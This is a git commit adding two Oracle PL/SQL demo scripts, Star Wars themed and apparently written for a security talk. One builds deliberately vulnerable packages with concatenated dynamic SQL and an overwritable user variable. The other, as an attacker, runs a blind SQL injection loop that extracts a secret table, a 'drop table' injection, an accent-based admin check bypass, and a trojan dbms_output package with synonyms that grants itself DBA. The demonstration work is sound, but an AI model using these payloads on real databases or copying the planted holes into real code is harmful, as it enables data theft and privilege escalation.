0c19e8db3a011df1cba366e71be233b3837ccb87
Samuel Nitsche <samuel.nitsche@smenso.de>
2019-11-14 15:58:55 +0100

    Walkthrough-scripts without comments

---
+++ demo_walkthrough/darth_ora_nocomment.sql
@@ -0,0 +1,299 @@
+#pause
+set echo on
+select * from users;
+
+#pause
+select * from roles;
+
+#pause
+select * from user_roles;
+
+#pause
+select * from deathstar_rooms;
+select * from user_room_access;
+
+#pause
+
+#pause--*
+
+create or replace package room_info as
+  function get_room_id( i_name varchar2 ) return integer;
+end;
+/
+#pause
+create or replace package body room_info as
+  function get_room_id( i_name varchar2 ) return integer
+  as
+    c_curs sys_refcursor;
+    v_row deathstar_rooms%rowtype;
+    l_id integer;
+    begin
+      open c_curs for
+        'select * from deathstar_rooms where lower(name) like lower(''%' || i_name || '%'')';
+      loop
+        fetch c_curs into v_row;
+        exit when c_curs%notfound or l_id is not null;
+        dbms_output.put_line('Room found: ' || v_row.name);
+        l_id := v_row.id;
+      end loop;
+
+      return l_id;
+    end;
+end;
+/
+#pause
+
+select room_info.get_room_id('Vader') from dual;
+#pause
+
+select room_info.get_room_id('''); drop table deathstar_rooms;--') from dual;
+#pause --*
+
+create or replace package room_info as
+  function get_room_id( i_name varchar2 ) return integer;
+
+  procedure allow_room_access(
+    i_room_id simple_integer,
+    i_user_id simple_integer );
+end;
+/
+#pause
+
+create or replace package body room_info as
+  function get_room_id( i_name varchar2 ) return integer
+  as
+    c_curs sys_refcursor;
+    v_row deathstar_rooms%rowtype;
+    l_id integer;
+    begin
+      open c_curs for
+        'select * from deathstar_rooms where lower(name) like lower(''%' || i_name || '%'')';
+      loop
+        fetch c_curs into v_row;
+        exit when c_curs%notfound or l_id is not null;
+        dbms_output.put_line('Room found: ' || v_row.name);
+        l_id := v_row.id;
+      end loop;
+
+      return l_id;
+    end;
+
+  procedure allow_room_access(
+    i_room_id simple_integer,
+    i_user_id simple_integer )
+  as
+    l_room_code varchar2(200);
+    l_log_table varchar2(40) := 'LOG_'||to_char(sysdate, 'YYYYMM');
+    begin
+      insert into user_room_access ( id_user, id_room )
+        select i_user_id, i_room_id
+          from dual
+          where (i_user_id, i_room_id) not in (select id_user, id_room from user_room_access);
+
+      -- Logging: We need dyn. sql
+      select code into l_room_code from deathstar_rooms where id = i_room_id;
+      execute immediate '
+        begin
+          insert into ' || dbms_assert.simple_sql_name(l_log_table) || ' ( message )
+            values (''User ' || i_user_id || ' has now access to room ' || l_room_code || ''');
+        end;
+      ';
+    end;
+end;
+/
+#pause
+
+#pause--*
+
+/* Definer's and Invoker's rights  */
+#pause
+connect darth_dba/darth_dba@localhost:1522/ORCLPDB1
+#pause
+create user sabine identified by sabine  default tablespace users quota unlimited on users;
+grant connect to sabine;
+grant resource to sabine;
+
+#pause--*
+
+connect deathstar/deathstar@localhost:1522/ORCLPDB1
+#pause
+
+create or replace package pkg_control as
+
+  v_user integer;
+
+  function get_user return number;
+
+  function get_user_role return varchar2;
+
+end;
+/
+#pause
+create or replace package body pkg_control as
+
+  function get_user return number
+  as
+    v_id integer;
+  begin
+    return v_user;
+  end get_user ;
+
+  function get_user_role return varchar2
+  as
+    v_role_name roles.role_name%TYPE;
+  begin
+
+    select r.role_name
+    into v_role_name
+    from user_roles ur join roles r on (r.id = ur.id_role)
+    where id_user = v_user;
+
+    return v_role_name;
+  end get_user_role;
+
+begin -- init des Packages
+  if v_user is null then
+    case sys_context('USERENV', 'SESSION_USER')
+      when 'DARTH_DBA' then
+        v_user := 1; -- Deathstar-DBA ist Admin
+      else
+        v_user := 2; -- Default ist READ
+    end case;
+  end if;
+end;
+/
+#pause
+create or replace package pkg_control as
+
+  v_user integer;
+
+  function get_user return number;
+
+  function get_user_role return varchar2;
+
+end;
+/
+#pause
+set serveroutput on
+begin
+  dbms_output.put_line( 'User-ID: ' || pkg_control.get_user );
+  dbms_output.put_line( 'User-ROLE: ' || pkg_control.get_user_role );
+end;
+/
+#pause
+
+begin
+  pkg_control.v_user := 1;
+  dbms_output.put_line( 'User-ID: ' || pkg_control.get_user );
+  dbms_output.put_line( 'User-ROLE: ' || pkg_control.get_user_role );
+end;
+/
+#pause
+
+ALTER SESSION SET PLSCOPE_SETTINGS='IDENTIFIERS:ALL, STATEMENTS:ALL';
+
+begin
+  DBMS_UTILITY.compile_schema(schema => 'DEATHSTAR', compile_all => true);
+end;
+/
+#pause
+select *
+  from user_identifiers
+  where object_type = 'PACKAGE'
+    and usage = 'DECLARATION'
+    and type = 'VARIABLE';
+#pause
+
+create or replace package pkg_control as
+
+  function get_user return number;
+
+  function get_user_role return varchar2;
+
+end;
+/
+#pause
+create or replace package body pkg_control as
+
+  v_user integer;
+
+  function get_user return number
+  as
+    v_id integer;
+  begin
+    return v_user;
+  end get_user ;
+#pause
+  function get_user_role return varchar2
+  as
+    v_role_name roles.role_name%TYPE;
+  begin
+
+    select r.role_name
+    into v_role_name
+    from user_roles ur join roles r on (r.id = ur.id_role)
+    where id_user = v_user;
+
+    return v_role_name;
+  end get_user_role;
+
+begin -- init des Packages
+  if v_user is null then
+    case sys_context('USERENV', 'SESSION_USER')
+      when 'DARTH_DBA' then
+        v_user := 1; -- Deathstar-DBA ist Admin
+      else
+        v_user := 2; -- Default ist READ
+    end case;
+  end if;
+end;
+/
+#pause
+
+select *
+  from user_identifiers
+  where object_type = 'PACKAGE'
+    and usage = 'DECLARATION'
+    and type = 'VARIABLE';
+#pause
+begin
+  dbms_output.put_line( 'User-ID: ' || pkg_control.get_user );
+  dbms_output.put_line( 'User-ROLE: ' || pkg_control.get_user_role );
+end;
+/
+#pause
+
+create or replace function is_admin( i_username varchar2 )
+ return integer
+as
+  begin
+    if ( i_username = 'ADMIN') then
+      return 1;
+    else
+      return 0;
+    end if;
+  end;
+/
+#pause
+grant execute on is_admin to public;
+
+#pause--*
+
+connect darth_dba/darth_dba@localhost:1522/ORCLPDB1
+
+grant administer database trigger to sabine;
+
+#pause--*
+
+grant create any synonym to sabine;
+
+#pause--*
+
+declare
+  l_room_id integer;
+begin
+  l_room_id := deathstar.room_info.get_room_id('Vader');
+  dbms_output.put_line('ID: ' || l_room_id);
+end;
+/
+#pause--*
---
+++ demo_walkthrough/sabine_nocomment.sql
@@ -0,0 +1,189 @@
+#pause
+set echo on
+
+select * from deathstar_rooms;
+#pause
+
+-- Inject with APEX
+#pause
+
+select * from deathstar_rooms;
+#pause
+
+#pause--*
+
+
+
+select room_info.get_room_id(''') and exists(select 1 from imperial_secrets where id = 1 and lower(substr(secret, 1, 1)) = ''a'') --') result from dual;
+#pause
+select room_info.get_room_id(''') and exists(select 1 from imperial_secrets where id = 1 and lower(substr(secret, 1, 1)) = ''b'') --') result from dual;
+#pause
+select room_info.get_room_id(''') and exists(select 1 from imperial_secrets where id = 1 and lower(substr(secret, 1, 1)) = ''c'') --') result from dual;
+#pause
+
+select room_info.get_room_id(''') and exists(select 1 from imperial_secrets where id = 1 and lower(substr(secret, 1, 1)) = ''v'') --') result from dual;
+#pause
+
+set serveroutput on
+declare
+  l_secret varchar2(4000);
+
+  function chk_char(i_idx integer)
+    return varchar2
+  as
+    l_malicious_stmt varchar2(4000);
+  begin
+    for char_ascii in 1..90
+      loop
+        l_malicious_stmt :=
+            ''') and exists(select 1 from imperial_secrets where id = 1 and' ||
+            ' lower(substr(secret, ' || i_idx || ', 1)) = ''' || lower(chr(char_ascii)) || ''') --';
+        if (room_info.get_room_id(l_malicious_stmt) = 1) then
+          return chr(char_ascii);
+        end if;
+      end loop;
+    return '?';
+  end;
+begin
+  begin
+    for idx in 1..30
+      loop
+        l_secret := l_secret || chk_char(idx);
+      end loop;
+  exception
+    when others then
+      dbms_output.put_line(sqlerrm);
+  end;
+  dbms_output.put_line('Secret: ' || l_secret);
+end;
+/
+#pause
+
+#pause--*
+select code from deathstar_rooms;
+#pause
+select * from user_roles;
+select * from users;
+#pause
+call room_info.allow_room_access(2, 1);
+#pause
+select * from user_roles;
+#pause
+select * from log_201911;
+#pause
+
+#pause--*
+
+connect sabine/sabine@localhost:1522/ORCLPDB1
+#pause
+
+create table secret_dump (
+  secret varchar2(4000),
+  created timestamp default current_timestamp
+);
+
+create or replace function bad_func
+  return varchar2 authid current_user -- Invoker's rights!
+  as
+    pragma autonomous_transaction;
+  begin
+    execute immediate 'insert into sabine.secret_dump (secret) select secret from imperial_secrets';
+    commit;
+    return 'Y';
+  end;
+/
+
+grant execute on bad_func to public;
+grant insert on secret_dump to public;
+#pause
+
+truncate table secret_dump;
+select * from secret_dump;
+#pause
+
+select deathstar.room_info.get_room_id(''') and sabine.bad_func() = ''Y''--') from dual;
+#pause
+
+select * from secret_dump;
+#pause
+
+#pause--*
+
+ALTER SESSION SET NLS_SORT = BINARY_AI NLS_COMP = LINGUISTIC;
+#pause
+select deathstar.is_admin('aDMIN') from dual;
+#pause
+select deathstar.is_admin('Ädmin') from dual;
+#pause
+
+#pause--*
+
+create or replace trigger trg_client_detection
+after logon
+on database
+begin
+  execute immediate 'ALTER SESSION SET NLS_SORT = BINARY_AI NLS_COMP = LINGUISTIC';
+end;
+/
+#pause
+connect deathstar/deathstar@localhost:1522/ORCLPDB1
+#pause
+select is_admin('Ädmin') from dual;
+#pause
+
+connect sabine/sabine@localhost:1522/ORCLPDB1
+create or replace package malicious_dbms_output authid current_user as
+  procedure put_line( i_input varchar2 );
+end;
+/
+#pause
+
+create or replace package body malicious_dbms_output as
+
+  procedure grant_us_dba
+  as
+    pragma autonomous_transaction;
+    begin
+      execute immediate 'grant dba to sabine';
+      sys.dbms_output.put_line('Granting succeeded!'); -- Diese würden im echten Fall natürlich ausgelassen!
+    exception when others then
+      sys.dbms_output.put_line('Granting DBA not succeeded: ' || sqlerrm); -- Diese würden im echten Fall natürlich ausgelassen!
+      null;
+    end;
+
+  procedure put_line( i_input varchar2 )
+  as
+    begin
+      grant_us_dba();
+      sys.dbms_output.put_line(i_input);
+    end;
+end;
+/
+#pause
+
+grant execute on malicious_dbms_output to public;
+#pause
+select * from user_role_privs;
+#pause--*
+
+select * from user_role_privs;
+#pause
+
+create synonym deathstar.dbms_output for malicious_dbms_output;
+create synonym darth_dba.dbms_output for malicious_dbms_output;
+#pause
+
+select deathstar.room_info.get_room_id('Vader') from dual;
+#pause
+
+--     _____                                             __     __)
+--    (, /  |              . .    /)                    (, /|  /|
+--     ./-- | ___     __   _   _ (/   _  _/_  _ __        / | / |  _____  _    _ __
+--   ) /    |_// (_   / (_(_(_(__/ )_/_)_(___(/_/ (_   ) /  |/  |_(_)/ (_(_/__(/_/ (_
+--  (_/                                               (_/   '           .-/
+--                                                                     (_/
+
+#pause--*
+
+
+select * from user_role_privs;
